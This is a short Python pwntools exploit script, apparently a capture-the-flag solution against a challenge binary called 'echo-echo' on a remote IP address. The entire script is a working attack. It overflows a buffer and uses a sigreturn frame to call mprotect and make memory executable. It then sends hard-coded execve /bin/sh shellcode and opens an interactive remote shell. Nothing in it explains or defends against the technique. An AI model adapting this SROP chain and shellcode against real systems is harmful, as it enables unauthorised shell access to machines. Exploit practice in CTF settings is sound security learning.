from pwn import *
import time 

p = remote('3.97.113.25',9002)
#p = process("./echo-echo")
context.clear(arch='amd64')
#context.log_level = 'debug'
#pause()
syscall_ret = 0x40009b
read = 0x400091
writable = 0x400000
new_ret = 0x400018 # Program Entrypoint

payload = 'A'*8
payload += p64(read)
payload += p64(syscall_ret)

frame = SigreturnFrame()
frame.rax = 0xa
frame.rdi = writable
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = new_ret
frame.rip = syscall_ret

payload += str(frame)

# sending
time.sleep(1.0)
p.send(payload)
time.sleep(1.0)
payload = 'B'*0xf # sigret
p.send(payload)

# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = ""
shellcode += "\x31\xc0\x48\xbb\xd1\x9d\x96"
shellcode += "\x91\xd0\x8c\x97\xff\x48\xf7"
shellcode += "\xdb\x53\x54\x5f\x99\x52\x57"
shellcode += "\x54\x5e\xb0\x3b\x0f\x05"

payload = 'A'*8
payload += p64(new_ret+8)
payload += shellcode

p.send(payload)
time.sleep(1.0)
p.interactive()
